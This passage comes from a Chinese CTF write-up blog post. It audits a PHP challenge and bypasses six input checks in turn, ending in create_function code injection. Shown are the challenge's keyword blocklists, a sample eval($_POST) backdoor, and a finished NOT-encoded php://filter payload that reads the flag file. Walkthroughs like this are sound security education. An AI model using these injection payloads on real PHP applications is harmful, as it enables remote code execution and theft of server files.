preg_match(&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#x27;|log/i&#x27;, $_SERVER[&#x27;QUERY_STRING&#x27;])</span><br><span class="line">        )  </span><br><span class="line">        die(&#x27;You seem to want to do something bad?&#x27;); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (!preg_match(&#x27;/http|https/i&#x27;, $_GET[&#x27;file&#x27;])) &#123;</span><br><span class="line">    if (preg_match(&#x27;/^aqua_is_cute$/&#x27;, $_GET[&#x27;debu&#x27;]) &amp;&amp; $_GET[&#x27;debu&#x27;] !== &#x27;aqua_is_cute&#x27;) &#123; </span><br><span class="line">        $file = $_GET[&quot;file&quot;]; </span><br><span class="line">        echo &quot;Neeeeee! Good Job!&lt;br&gt;&quot;;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; else die(&#x27;fxck you! What do you want to do ?!&#x27;);</span><br><span class="line"></span><br><span class="line">if($_REQUEST) &#123; </span><br><span class="line">    foreach($_REQUEST as $value) &#123; </span><br><span class="line">        if(preg_match(&#x27;/[a-zA-Z]/i&#x27;, $value))  </span><br><span class="line">            die(&#x27;fxck you! I hate English!&#x27;); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">if (file_get_contents($file) !== &#x27;debu_debu_aqua&#x27;)</span><br><span class="line">    die(&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123;</span><br><span class="line">    extract($_GET[&quot;flag&quot;]);</span><br><span class="line">    echo &quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;;</span><br><span class="line">&#125; else&#123;</span><br><span class="line">    die(&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(preg_match(&#x27;/^[a-z0-9]*$/isD&#x27;, $code) || </span><br><span class="line">preg_match(&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#x27;, $arg) ) &#123; </span><br><span class="line">    die(&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;); </span><br><span class="line">&#125; else &#123; </span><br><span class="line">    include &quot;flag.php&quot;;</span><br><span class="line">    $code(&#x27;&#x27;, $arg); </span><br><span class="line">&#125; ?&gt;</span><br><span class="line">This is a very simple challenge and if you solve it I will give you a flag. Good Luck!</span><br><span class="line">fxck you! I hate English!</span><br></pre></td></tr></table></figure>

<p>通过对代码的审计，我们可以利用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">$code(&#x27;&#x27;, $arg); </span><br></pre></td></tr></table></figure>
<p>来构造函数，执行恶意代码，但是我们需要绕过6个if</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> if (preg_match(&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#x27;|log/i&#x27;, $_SERVER[&#x27;QUERY_STRING&#x27;]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> if (preg_match(&#x27;/^aqua_is_cute$/&#x27;, $_GET[&#x27;debu&#x27;]) &amp;&amp; $_GET[&#x27;debu&#x27;] !== &#x27;aqua_is_cute&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">foreach($_REQUEST as $value) &#123; </span><br><span class="line">	if(preg_match(&#x27;/[a-zA-Z]/i&#x27;, $value))</span><br><span class="line"></span><br><span class="line">if (file_get_contents($file) !== &#x27;debu_debu_aqua&#x27;)</span><br><span class="line"></span><br><span class="line">if ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )</span><br><span class="line"></span><br><span class="line">if(preg_match(&#x27;/^[a-z0-9]*$/isD&#x27;, $code) || </span><br><span class="line">preg_match(&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#x27;, $arg) )</span><br></pre></td></tr></table></figure>

<h3 id="对于第一个if，我们可以看向-SERVER-‘QUERY-STRING’-，作用是获取查询语句，即获取-后面的值，而-SERVER-还有其它的参数的值，作用各不相同"><a href="#对于第一个if，我们可以看向-SERVER-‘QUERY-STRING’-，作用是获取查询语句，即获取-后面的值，而-SERVER-还有其它的参数的值，作用各不相同" class="headerlink" title="对于第一个if，我们可以看向$_SERVER[‘QUERY_STRING’]，作用是获取查询语句，即获取?后面的值，而$_SERVER[]还有其它的参数的值，作用各不相同"></a>对于第一个if，我们可以看向$_SERVER[‘QUERY_STRING’]，作用是获取查询语句，即获取?后面的值，而$_SERVER[]还有其它的参数的值，作用各不相同</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$_SERVER[&quot;REQUEST_URI&quot;]：获取http://localhost后面的值，包括/</span><br><span class="line"></span><br><span class="line">$_SERVER[&quot;SCRIPT_NAME&quot;]：获取当前脚本的路径</span><br><span class="line"></span><br><span class="line">$_SERVER[&quot;PHP_SELF&quot;]：获取当前正在执行脚本的文件名</span><br></pre></td></tr></table></figure>
<h4 id="SERVER-使用的实例"><a href="#SERVER-使用的实例" class="headerlink" title="$_SERVER[]使用的实例"></a>$_SERVER[]使用的实例</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">1，http://localhost/aaa/ (打开aaa中的index.php)</span><br><span class="line">结果：</span><br><span class="line">$_SERVER[&#x27;QUERY_STRING&#x27;] = &quot;&quot;;</span><br><span class="line">$_SERVER[&#x27;REQUEST_URI&#x27;] = &quot;/aaa/&quot;;</span><br><span class="line">$_SERVER[&#x27;SCRIPT_NAME&#x27;] = &quot;/aaa/index.php&quot;;</span><br><span class="line">$_SERVER[&#x27;PHP_SELF&#x27;] = &quot;/aaa/index.php&quot;;</span><br><span class="line"></span><br><span class="line">2，http://localhost/aaa/?p=222 (附带查询)</span><br><span class="line">结果：</span><br><span class="line">$_SERVER[&#x27;QUERY_STRING&#x27;] = &quot;p=222&quot;;</span><br><span class="line">$_SERVER[&#x27;REQUEST_URI&#x27;] = &quot;/aaa/?p=222&quot;;</span><br><span class="line">$_SERVER[&#x27;SCRIPT_NAME&#x27;] = &quot;/aaa/index.php&quot;;</span><br><span class="line">$_SERVER[&#x27;PHP_SELF&#x27;] = &quot;/aaa/index.php&quot;;</span><br><span class="line"></span><br><span class="line">3，http://localhost/aaa/index.php?p=222&amp;q=333</span><br><span class="line">结果：</span><br><span class="line">$_SERVER[&#x27;QUERY_STRING&#x27;] = &quot;p=222&amp;q=333&quot;;</span><br><span class="line">$_SERVER[&#x27;REQUEST_URI&#x27;] = &quot;/aaa/index.php?p=222&amp;q=333&quot;;</span><br><span class="line">$_SERVER[&#x27;SCRIPT_NAME&#x27;] = &quot;/aaa/index.php&quot;;</span><br><span class="line">$_SERVER[&#x27;PHP_SELF&#x27;] = &quot;/aaa/index.php&quot;;</span><br></pre></td></tr></table></figure>
<p>而$_SERVER[‘QUERY_STRING’]有个特性，就是不会进行URLDecode，而$_GET[]会，所以可以通过url编码绕过第一个if</p>
<h2 id="对于第二个if"><a href="#对于第二个if" class="headerlink" title="对于第二个if"></a>对于第二个if</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (preg_match(&#x27;/^aqua_is_cute$/&#x27;, $_GET[&#x27;debu&#x27;]) &amp;&amp; $_GET[&#x27;debu&#x27;] !== &#x27;aqua_is_cute&#x27;)</span><br></pre></td></tr></table></figure>
<p>我们可以看到preg_match中的/^$/可知是单行的匹配，而且这个if的思路是debu参数的值既要是aqua_is_cute，又不可以是aqua_is_cute，所以对于这种情况，我们可以使用换行符%0a来绕过，即</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debu=%0aaqua_is_cute</span><br></pre></td></tr></table></figure>
<h2 id="对于第三个if"><a href="#对于第三个if" class="headerlink" title="对于第三个if"></a>对于第三个if</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">foreach($_REQUEST as $value) &#123; </span><br><span class="line">	if(preg_match(&#x27;/[a-zA-Z]/i&#x27;, $value))</span><br></pre></td></tr></table></figure>
<p>由于这里想限制我们传入的值不可以是字母，而$_REQUEST不仅会接收get请求，也会接收post请求和cookie请求，但是post优先级比较大，所以我们只需get传入参数，post再传入传入相同参数，便可绕过，此时php.ini中的variables_order的设置，默认为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">variables_order = &quot;GPCS&quot;</span><br></pre></td></tr></table></figure>

<h2 id="对于第四个if"><a href="#对于第四个if" class="headerlink" title="对于第四个if"></a>对于第四个if</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (file_get_contents($file) !== &#x27;debu_debu_aqua&#x27;)</span><br></pre></td></tr></table></figure>
<p>可以使用data伪协议进行绕过，即</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain,debu_debu_aqua</span><br></pre></td></tr></table></figure>

<h2 id="对于第五个if"><a href="#对于第五个if" class="headerlink" title="对于第五个if"></a>对于第五个if</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )</span><br></pre></td></tr></table></figure>
<p>我们可以构造数组进行绕过，因为传入sha1()函数的参数的值为数组时会报错，返回false，所以当构造数组时可以绕过，即</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shana[]=1&amp;passwd[]=2</span><br></pre></td></tr></table></figure>
<h2 id="对于第六个if"><a href="#对于第六个if" class="headerlink" title="对于第六个if"></a>对于第六个if</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if(preg_match(&#x27;/^[a-z0-9]*$/isD&#x27;, $code) || </span><br><span class="line">preg_match(&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#x27;, $arg) )</span><br></pre></td></tr></table></figure>
<p>我们可以看向正则中匹配的地方</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/^[a-z0-9]*$/isD</span><br></pre></td></tr></table></figure>
<p>可以看见后面是isD，其中i是不分大小写，而s是.匹配包括换行的所有元素，D是$只匹配字符串末尾，不匹配换行，而/^*$/意思是不能从头到尾是字母和数字，所以我们可以使用create_function()函数</p>
<h4 id="create-function"><a href="#create-function" class="headerlink" title="create_function()"></a>create_function()</h4><p>create_function()函数有两个参数$args和$code，用于创建一个lambda样式的函数</p>
<h5 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h5><p>php创建一个函数，即</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function myFunc($a,$b)&#123;</span><br><span class="line">	return $a+$b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后使用create_function()函数创建相同的myFunc()函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$myFunc=create_function(&#x27;$a,$b&#x27;,&#x27;return($a+$b);&#x27;);</span><br></pre></td></tr></table></figure>
<p>即</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function myFunc($a,$b)&#123;</span><br><span class="line">	return $a+$b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>所以我们可以这样使用这个create_function函数，来执行我们想要的代码<br>create_function构造</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$myFunc = create_function(&#x27;$a, $b&#x27;, &#x27;return($a+$b);&#125;eval($_POST[&#x27;Y1ng&#x27;]);\\&#x27;);</span><br></pre></td></tr></table></figure>
<p>执行时</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function myFunc($a, $b)&#123;</span><br><span class="line">	return $a+$b;</span><br><span class="line">&#125;</span><br><span class="line">eval($_POST[&#x27;Y1ng&#x27;]);//&#125;</span><br></pre></td></tr></table></figure>
<p>但是因为$arg被过滤太多的系统函数，所以我们可以使用get_defined_vars()来输出所有的变量和值，所以我们可以构造</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag[arg]=;&#125;var_dump(get_defined_vars());</span><br></pre></td></tr></table></figure>
<p>我们可以看见它让我们在rea1fl4g.php中读取flag，所以我们可以使用require代替include包含，因为include被过滤了，而由于过滤了双引号，所以可以使用base64_decode()来绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag[arg]=;&#125;require(base64_decode(cmVhMWZsNGcucGhw));var_dump(get_defined_vars);//</span><br></pre></td></tr></table></figure>
<p>来读取flag，但是这个方法我试不通，所以我们使用了取反来读，exp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$s = &#x27;php://filter/convert.base64-encode/resource=rea1fl4g.php&#x27;;</span><br><span class="line">echo urlencode(~$s);</span><br></pre></td></tr></table></figure>
<p>然后构造</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag[arg]=&#125;require(~%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F);//</span><br></pre></td></tr></table></figure>
<p>对于这题注意的点是要将cookie删掉，否则绕不过第三个if</p>
<p>参考文章：[<a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/111824177]">https://blog.csdn.net/rfrder/article/details/111824177]</a></p>
<pre><code>[https://www.gem-love.com/ctf/770.html]

[https://www.php.net/manual/zh/reference.pcre.pattern.modifiers.php]
</code></pre>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
  
    <nav id="page-nav">
      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/12/">12</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
    </nav>
  
</div>
      <footer id="footer">
  <div class="outer">
    <div id="footer-info">
      <div class="footer-left">
        &copy; 2021 John Doe
      </div>
        <div class="footer-right">
          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/smackgg/hexo-theme-smackdown" target="_blank">Smackdown</a>
        </div>
    </div>
  </div>
</footer>
    </div>
    
  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">



<script>
	var yiliaConfig = {
		fancybox: true,
		mathjax: true,
		animate: true,
		isHome: true,
		isPost: false,
		isArchive: false,
		isTag: false,
		isCategory: false,
		open_in_new: false
	}
</script>

<script src="/js/main.js"></script>




<script type="text/x-mathjax-config">
MathJax.Hub.Config({
    tex2jax: {
        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
        processEscapes: true,
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    }
});

MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';                 
    }       
});
</script>

<script src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js"></script>


  </div>
</body>
</html>